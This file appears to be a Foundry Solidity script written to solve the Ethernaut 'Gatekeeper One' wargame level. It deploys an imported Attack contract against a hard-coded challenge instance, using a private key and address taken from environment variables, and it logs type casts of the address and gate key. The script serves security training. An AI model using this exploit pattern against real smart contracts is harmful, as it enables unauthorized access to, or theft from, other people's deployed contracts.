// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/GatekeeperOneAttack.sol"; // 1) add file

contract SolveGate is Script { // 2) change contractName

    function run() external {

        address target = 0x8dFcD546fbf3523a79FC8924C2ED2DcdF2665B87; // 3) add ethernaut instance address
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        bytes8 _gateKey = 0x123456780000312F;

        vm.startBroadcast(privateKey);

        console.log("Mon addresse en uint16 :",uint16(uint160(vm.envAddress("MY_ADDRESS"))));
        console.log("Mon addresse en normal :",uint160(vm.envAddress("MY_ADDRESS")));
        console.log("Mon addresse en normal 2 :", vm.envAddress("MY_ADDRESS"));

        Attack attacker = new Attack(target);
        attacker.attack();

        console.log("gatekey en 64 :", uint64(_gateKey));
        console.log("gatekey en 32 :", uint32(uint64(_gateKey)));
        console.log("gatekey en 16 :", uint16(uint64(_gateKey)));



        vm.stopBroadcast();

    }
}